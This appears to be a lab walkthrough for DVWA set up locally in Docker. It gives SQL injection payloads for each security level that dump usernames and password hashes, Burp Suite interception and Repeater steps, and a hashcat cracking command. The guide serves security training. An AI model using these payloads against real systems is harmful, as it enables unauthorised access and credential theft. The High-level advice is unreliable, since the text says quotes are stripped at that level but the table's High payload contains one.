# Practical Guide — Task 2 (DVWA Setup) + Task 3 (SQL Injection)

Repo: https://github.com/Bhandarihansraj/cyberSEC

---

## TASK 2 — DVWA Setup (Docker)

### Start
```bash
cd cyberSEC
./tasks/task2_dvwa_setup/run.sh start
```
Or via menu: `./menu.sh` → select `2` → `s`

### First-time browser setup
1. Open `http://127.0.0.1:4280`
2. Login: `admin` / `password`
3. Left menu → **Create / Reset Database** → wait for success message
4. Login again with same credentials

### Stop
```bash
./tasks/task2_dvwa_setup/run.sh stop
```
Removes the container + network. No data is kept between runs — you'll need to Create/Reset Database again next start.

### Security reminder
Bound to `127.0.0.1:4280` only. Never forward this port externally — DVWA is intentionally vulnerable.

---

## TASK 3 — SQL Injection

### Setup
1. In DVWA, left menu → **DVWA Security** → set level (Low / Medium / High) → Submit
2. Run: `./tasks/task3_sql_injection/run.sh start` (confirms DVWA is up, prints this same checklist in terminal)
3. Left menu → **SQL Injection**

### Find column count first (needed for UNION payloads at every level)
```
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
```
Increase the number until it errors — the last one that worked = number of columns. DVWA's `users` table needs 2 columns, so `UNION SELECT user, password FROM users` is what you'll use below.

---

### LOW — direct browser input
No filtering on input. Type straight into the User ID box:

```
1' OR '1'='1
```
Returns all users (auth bypass style — always-true condition).

To dump credentials:
```
1' UNION SELECT user, password FROM users-- -
```

**Burp needed?** No — plain text field, no client-side restriction.

---

### MEDIUM — Burp required (dropdown restriction)

The input is a `<select>` dropdown, not free text, so you can't type a payload directly in the browser.

1. Set browser proxy → `127.0.0.1:8080`
2. Burp → Proxy → Intercept **ON**
3. In DVWA, pick any ID from dropdown → Submit
4. Burp captures the POST request — find `id=1` in the body
5. Quotes are stripped in Medium, so use a **numeric** payload (no `'`):
   ```
   id=1 UNION SELECT user, password FROM users-- -
   ```
6. Forward the request → response shows all usernames + password hashes

---

### HIGH — Burp Repeater + session cookie

High strips quotes **and** limits results with `LIMIT 1`, plus requires a valid session token in the request.

1. Intercept a normal request in Burp Proxy (same as Medium) once, to capture the `PHPSESSID` cookie and correct request format
2. Send it to **Repeater** (`Ctrl+R`)
3. Edit the `id` parameter:
   ```
   id=1 UNION SELECT user, password FROM users LIMIT 1,1-- -
   ```
4. Click Send — repeat/edit the `LIMIT` offset (`LIMIT 2,1`, `LIMIT 3,1`, …) in Repeater to pull each row one at a time, since High only returns one row per request
5. Keep the same `PHPSESSID` cookie on every request — if session expires, re-login in browser and re-capture

---

### After extraction — cracking hashes
DVWA stores passwords as MD5. Copy a hash out of the response and either:
- CyberChef → "MD5" recipe → compare against known wordlist hashes, or
- `hashcat -m 0 hash.txt rockyou.txt` (offline, your own lab only)

---

## Quick payload reference

| Level  | Access method     | Payload |
|--------|-------------------|---------|
| Low    | Browser directly   | `1' OR '1'='1` |
| Low    | Browser directly   | `1' UNION SELECT user, password FROM users-- -` |
| Medium | Burp Proxy         | `1 UNION SELECT user, password FROM users-- -` |
| High   | Burp Repeater       | `1' UNION SELECT user, password FROM users LIMIT 1,1-- -` |

**Rule of thumb:** Low = quotes work, free text. Medium = quotes stripped, numeric only, needs Burp because of dropdown. High = quotes stripped + LIMIT 1 + session required, needs Burp Repeater for row-by-row extraction.
